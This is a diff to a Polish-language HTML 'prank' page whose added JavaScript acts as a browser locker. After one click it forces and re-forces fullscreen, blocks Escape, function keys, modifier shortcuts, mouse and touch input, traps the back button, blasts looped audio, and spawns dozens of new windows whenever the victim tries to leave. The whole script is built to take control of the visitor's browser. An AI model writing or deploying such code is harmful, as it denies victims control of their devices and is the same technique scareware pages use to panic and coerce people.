@@ -1,78 +1,213 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-<meta charset="utf-8">
-<title>no to masz przejebane</title>
-<style>
-  body,html{margin:0;height:100%;background:#000;overflow:hidden}
-  #s {position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);padding:40px 90px;font-size:70px;background:#900;color:#fff;border:none;border-radius:30px;cursor:pointer;box-shadow:0 0 60px #f00;}
-  #s:hover{background:#f00;transform:translate(-50%,-50%) scale(1.1);}
-</style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <title>Armageddon Prank - Nie Wyjdziesz Stąd Żywy</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+      background: #000;
+      overflow: hidden;
+      touch-action: none; /* Blokuje gesty na mobile */
+      -webkit-touch-callout: none; /* iOS */
+      -webkit-user-select: none; /* Safari */
+      -khtml-user-select: none; /* Konqueror */
+      -moz-user-select: none; /* Firefox */
+      -ms-user-select: none; /* IE/Edge */
+      user-select: none; /* Standard */
+    }
+    #start-button {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 50px 100px;
+      font-size: 80px;
+      background: linear-gradient(#f00, #900);
+      color: #fff;
+      border: none;
+      border-radius: 40px;
+      cursor: pointer;
+      box-shadow: 0 0 80px #f00, 0 0 20px #fff;
+      transition: all 0.3s ease;
+      z-index: 9999;
+    }
+    #start-button:hover {
+      background: linear-gradient(#f00, #c00);
+      transform: translate(-50%, -50%) scale(1.05);
+      box-shadow: 0 0 120px #f00, 0 0 40px #fff;
+    }
+    #overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #000;
+      display: none;
+      z-index: 9998;
+    }
+  </style>
 </head>
 <body>
 
-<button id="s">START = KONIEC ŚWIATA</button>
+  <button id="start-button">START = TWÓJ KONIEC</button>
+  <div id="overlay"></div>
 
-<audio id="a" loop preload="auto">
-  <source src="sound.mp3" type="audio/mpeg">
-</audio>
+  <audio id="prank-audio" loop preload="auto">
+    <source src="sound.mp3" type="audio/mpeg">
+    Twoja przeglądarka nie wspiera audio... ale i tak jesteś w pułapce.
+  </audio>
 
-<script>
-// === ARMAGEDON ===
-let apocalypse = false;
-let windowsOpened = 0;
-const MAX_WINDOWS = 50;
+  <script>
+    // === ULTIMATE NUKLEARNY SKRYPT - BLOKUJE WSZYSTKO ===
+    let isApocalypse = false;
+    let openedWindowsCount = 0;
+    const MAX_WINDOWS = 60; // Więcej okien dla większego chaosu
+    const SPAWN_INTERVAL = 300; // Szybsze spamowanie oknami (ms)
+    const FULLSCREEN_CHECK_INTERVAL = 500; // Częstsze sprawdzanie fullscreen (ms)
 
-function nuke() {
-  if (apocalypse) return;
-  apocalypse = true;
-
-  document.getElementById('s').remove();
-  document.getElementById('a').volume = 1;
-  document.getElementById('a').play();
-
-  // fullscreen w pętli
-  const fs = () => document.documentElement.requestFullscreen?.() || document.documentElement.webkitRequestFullscreen?.();
-  fs();
-  document.onfullscreenchange = () => { if (!document.fullscreenElement) fs(); };
-
-  // blokada klawiszy
-  document.onkeydown = e => {
-    if (e.key.includes('F') || e.ctrlKey || e.altKey || e.metaKey || e.key==='Escape') {
-      e.preventDefault(); e.stopPropagation(); fs();
-      return false;
+    // Funkcja do wchodzenia w fullscreen - kompatybilna z wszystkimi przeglądarkami
+    function enterFullscreen() {
+      const elem = document.documentElement;
+      if (elem.requestFullscreen) {
+        elem.requestFullscreen().catch(() => {});
+      } else if (elem.mozRequestFullScreen) { // Firefox
+        elem.mozRequestFullScreen();
+      } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
+        elem.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+      } else if (elem.msRequestFullscreen) { // IE/Edge
+        elem.msRequestFullscreen();
+      } else if (elem.webkitEnterFullscreen) { // iOS Safari
+        elem.webkitEnterFullscreen();
+      }
     }
-  };
-  document.oncontextmenu = () => false;
 
-  // === BOMBARDOWANIE NOWYMI OKNAMI ===
-  function spawn() {
-    if (windowsOpened >= MAX_WINDOWS) return;
-    const win = window.open(location.href, '_blank', 'width=800,height=600');
-    if (win) {
-      windowsOpened++;
-      // nowe okno też od razu ma iść w fullscreen i kontynuować atak
-      setTimeout(() => {
-        if (win && !win.closed) win.document.documentElement.requestFullscreen?.();
-      }, 300);
+    // Funkcja do sprawdzania i przywracania fullscreen
+    function monitorFullscreen() {
+      if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
+        enterFullscreen();
+      }
     }
-  }
 
-  // jak ktoś zamknie to okno → spamujemy nowymi co 400 ms
-  window.onbeforeunload = () => spawn();
-  window.onunload = () => {
-    const killer = setInterval(spawn, 400);
-    setTimeout(() => clearInterval(killer), 15000); // max 15 sekund spamu
-  };
+    // Funkcja do otwierania nowych okien z pułapką
+    function spawnNewWindow() {
+      if (openedWindowsCount >= MAX_WINDOWS) return;
+      const newWin = window.open(location.href, '_blank', 'width=1024,height=768,left=0,top=0');
+      if (newWin) {
+        openedWindowsCount++;
+        // W nowym oknie od razu fullscreen i nazwa dla auto-startu
+        newWin.name = 'apocalypse-window-' + Date.now();
+        setTimeout(() => {
+          if (newWin && !newWin.closed) {
+            newWin.document.documentElement.requestFullscreen?.();
+            newWin.focus();
+          }
+        }, 200);
+      }
+    }
 
-  // na wszelki wypadek co sekundę sprawdzamy, czy żyjemy
-  setInterval(fs, 800);
-}
+    // Główna funkcja apokalipsy
+    function unleashHell() {
+      if (isApocalypse) return;
+      isApocalypse = true;
 
-document.getElementById('s').onclick = nuke;
+      // Usuń przycisk i pokaż overlay
+      const button = document.getElementById('start-button');
+      if (button) button.remove();
+      const overlay = document.getElementById('overlay');
+      if (overlay) overlay.style.display = 'block';
 
-// jeśli ktoś wejdzie drugi raz (z nowego okna) – od razu odpala się bez przycisku
-if (window.name.includes('hell')) nuke();
-</script>
+      // Odtwarzaj audio na max i w pętli
+      const audio = document.getElementById('prank-audio');
+      audio.volume = 1.0;
+      audio.play().catch(() => {}); // Na wypadek blokad autoplay
+
+      // Wejdź w fullscreen i monitoruj
+      enterFullscreen();
+      setInterval(monitorFullscreen, FULLSCREEN_CHECK_INTERVAL);
+
+      // Słuchacze na zmiany fullscreen dla wszystkich vendorów
+      document.addEventListener('fullscreenchange', monitorFullscreen);
+      document.addEventListener('mozfullscreenchange', monitorFullscreen);
+      document.addEventListener('webkitfullscreenchange', monitorFullscreen);
+      document.addEventListener('MSFullscreenChange', monitorFullscreen);
+
+      // Blokada wszystkich możliwych klawiszy i skrótów
+      const blockKeys = function(e) {
+        // Blokuj Esc, F11, F5, Ctrl/Alt/Meta + wszystko
+        if (
+          e.key === 'Escape' || e.key === 'Esc' || e.key === 'F11' || e.key === 'F5' ||
+          e.ctrlKey || e.altKey || e.metaKey || e.shiftKey || // Blokuj modyfikatory
+          e.key.includes('Tab') || e.key.includes('Arrow') || e.key.includes('Backspace') ||
+          (e.ctrlKey && (e.key.toLowerCase() === 'w' || e.key.toLowerCase() === 'r' || e.key.toLowerCase() === 'q' || e.key.toLowerCase() === 't')) ||
+          (e.altKey && e.key.toLowerCase() === 'f4') ||
+          (e.metaKey && (e.key.toLowerCase() === 'w' || e.key.toLowerCase() === 'q' || e.key.toLowerCase() === 'r'))
+        ) {
+          e.preventDefault();
+          e.stopPropagation();
+          e.stopImmediatePropagation();
+          enterFullscreen(); // Przywracaj fullscreen
+          return false;
+        }
+      };
+      document.addEventListener('keydown', blockKeys, true);
+      document.addEventListener('keyup', blockKeys, true);
+      document.addEventListener('keypress', blockKeys, true);
+      window.addEventListener('keydown', blockKeys, true);
+
+      // Blokada menu kontekstowego, kliknięć, drag/drop, select
+      document.addEventListener('contextmenu', e => { e.preventDefault(); return false; }, true);
+      document.addEventListener('click', e => { e.preventDefault(); return false; }, true);
+      document.addEventListener('dblclick', e => { e.preventDefault(); return false; }, true);
+      document.addEventListener('mousedown', e => { e.preventDefault(); return false; }, true);
+      document.addEventListener('mouseup', e => { e.preventDefault(); return false; }, true);
+      document.addEventListener('touchstart', e => { e.preventDefault(); return false; }, true);
+      document.addEventListener('touchend', e => { e.preventDefault(); return false; }, true);
+      document.addEventListener('touchmove', e => { e.preventDefault(); return false; }, true);
+      document.body.style.pointerEvents = 'none'; // Nic nie da się kliknąć
+
+      // Blokada gestów "wstecz" w historii (dla mobile i desktop)
+      history.pushState(null, null, location.href);
+      window.addEventListener('popstate', () => {
+        history.pushState(null, null, location.href);
+        enterFullscreen();
+        spawnNewWindow(); // Dodatkowe okno za karę
+      });
+
+      // Spam nowymi oknami przy próbie zamknięcia
+      window.addEventListener('beforeunload', () => {
+        spawnNewWindow();
+        spawnNewWindow(); // Podwójny spawn dla pewności
+      });
+      window.addEventListener('unload', () => {
+        const spamInterval = setInterval(spawnNewWindow, SPAWN_INTERVAL);
+        setTimeout(() => clearInterval(spamInterval), 20000); // Spam przez 20 sekund
+      });
+
+      // Dodatkowy monitor: co sekundę spawnuj okno jeśli mniej niż max
+      setInterval(() => {
+        if (openedWindowsCount < MAX_WINDOWS / 2) spawnNewWindow();
+      }, 1000);
+
+      // Dla mobile: blokada orientacji i zoomu
+      screen.orientation?.lock?.('portrait').catch(() => {});
+      document.addEventListener('orientationchange', enterFullscreen);
+    }
+
+    // Uruchom po kliknięciu
+    document.getElementById('start-button').addEventListener('click', unleashHell);
+
+    // Jeśli okno ma nazwę "apocalypse" - auto-start (dla nowych okien)
+    if (window.name.includes('apocalypse-window')) {
+      unleashHell();
+    }
+  </script>
 </body>
 </html>
